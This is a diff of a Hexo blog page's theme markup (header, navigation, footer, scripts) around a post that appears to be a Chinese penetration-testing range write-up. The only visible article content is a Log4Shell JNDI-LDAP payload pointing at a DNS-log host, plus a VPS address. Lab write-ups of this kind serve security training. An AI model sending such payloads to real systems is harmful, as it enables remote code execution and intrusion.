@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
   <meta charset="utf-8">
   
@@ -24,78 +24,116 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151433833.png">
   
-    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
   
+    <link rel="icon" href="/favicon.png">
   
-    <link rel="shortcut icon" href="/favicon.ico">
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
   
-  
-<link rel="stylesheet" href="/css/typing.css">
+<link rel="stylesheet" href="/css/style.css">
 
   
-<link rel="stylesheet" href="/css/donate.css">
+<link rel="stylesheet" href="/css/scrollUp/image.css">
 
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
   
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">greetdawn's Blog</div>
+      
+        <div id="subtitle">The God love people</div>
+      
+       <ul class="my-socials">
   
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-
-  
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-  
-    
-      <body>
-    
-  
-      <div id="container" class="container">
-        <article id="post-综合渗透/xiyu-new-bachang-cfs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <header id="header" class="header">
-  <nav class="mobile-nav">
-    <h1 class="nickname">NickName</h1>
-    <ul class="mobile-nav-menu">
-      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
-      <input type="checkbox" id="mobile-menu-toggle"/>
-      <ul class="mobile-nav-link">
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
         
-        <a href="/">Home</a>
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
         
-        <a href="/archives">Archives</a>
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">greetdawn&#39;s Blog</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
         
-        <a href="/about">About</a>
-        
-      </ul>
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="www.greetdawn.top">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
     </ul>
-  </nav>
-	
-		<nav id="main-nav" class="main-nav nav-left">
-	
-	
-	  <a class="main-nav-link" href="/">Home</a>
-	
-	  <a class="main-nav-link" href="/archives">Archives</a>
-	
-	  <a class="main-nav-link" href="/about">About</a>
-	
-  </nav>
+  </div>
 </header>
-
-  <hr/>
+      <div class="outer">
+        <section id="main"><article id="post-综合渗透/xiyu-new-bachang-cfs" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/" class="article-date">
+  <time datetime="2021-12-07T03:12:47.000Z" itemprop="datePublished">2021-12-07</time>
+</a>
+    
+  </div>
   <div class="article-inner">
     
-
     
       <header class="article-header">
         
   
-    <h1 class="p-name article-title" itemprop="headline name">
+    <h1 class="article-title" itemprop="name">
       第三期cfs靶场练习
     </h1>
   
 
       </header>
     
-    <div class="e-content article-entry typo" itemprop="articleBody">
+    <div class="article-entry" itemprop="articleBody">
       
         <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>4o5zj6.dnslog.cn<span class="token operator">/</span>cxvahp&#125;</span>
 vps：139.196.234.164
@@ -187,28 +225,20 @@ scan end</code></pre>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216184338762.png" alt="image-20211216184338762"></p>
 
       
-      
     </div>
     <footer class="article-footer">
-      <ul class="article-meta">
-        <li>
-          <span class="label">Published Date:</span>
-          <a href="/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/" class="article-date">
-  <time class="dt-published" datetime="2021-12-07T03:12:47.000Z" itemprop="datePublished">2021-12-07</time>
-</a>
+      
+        <a data-url="http://www.greetdawn.top/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/" data-id="ckzqi7ikl002cioumayyq96t3" class="article-share-link">分享到</a>
+      
 
-        </li>
-        
-        
-        <hr/>
-      </ul>
+      
     </footer>
   </div>
   
     
-<nav id="article-nav" class="article-nav">
+<nav id="article-nav">
   
-    <a href="/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/" id="article-nav-newer" class="article-nav-link-wrap newer">
+    <a href="/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
@@ -218,72 +248,67 @@ scan end</code></pre>
     </a>
   
   
-    <a href="/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/" id="article-nav-older" class="article-nav-link-wrap older">
+    <a href="/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
       <div class="article-nav-title">php-unserialize-getflag</div>
     </a>
   
 </nav>
 
-
   
 </article>
 
-
-
-
-
-
-
-
-
-
+</section>
+        
       </div>
-      
-    <footer id="footer" class="post-footer footer">
-      
-      <hr/>
-      <div id="footerContent" class="footer-content">
-        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>
-
-
-      </div>
-    </footer>
-
-      
-
-
-
-
-
-
-
-
-<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-
-
-<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
-
-
-
+      <footer id="footer">
   
-<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/typing.js"></script>
-
-<!--[if lt IE 9]>
-<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
-<![endif]-->
-
-
-
-
-
-
-
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 丨greetdawn丨<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
-  </body>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
 </html>
